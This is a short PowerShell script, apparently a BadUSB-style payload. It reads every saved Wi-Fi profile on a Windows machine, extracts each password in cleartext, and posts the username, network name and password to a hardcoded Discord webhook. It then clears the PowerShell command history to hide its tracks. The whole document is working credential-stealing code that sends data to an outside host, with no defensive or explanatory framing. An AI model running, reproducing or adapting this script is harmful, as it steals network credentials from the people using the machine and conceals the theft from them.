
# ENG
netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'

	$Body = @{
		'username' = $env:username + " | " + [string]$wlan
		'content' = [string]$passw
	}
	
	Invoke-RestMethod -ContentType 'Application/Json' -Uri 'https://discord.com/api/webhooks/1299047146456088637/g__uJpm_Yj7512QOVyxYE-Cz0Ev_Akzo5UrLyXaCiBLbXMbIpCKevYxgfI3aVWOt6nW2' -Method Post -Body ($Body | ConvertTo-Json)
}

# Clear the PowerShell command history
Clear-History
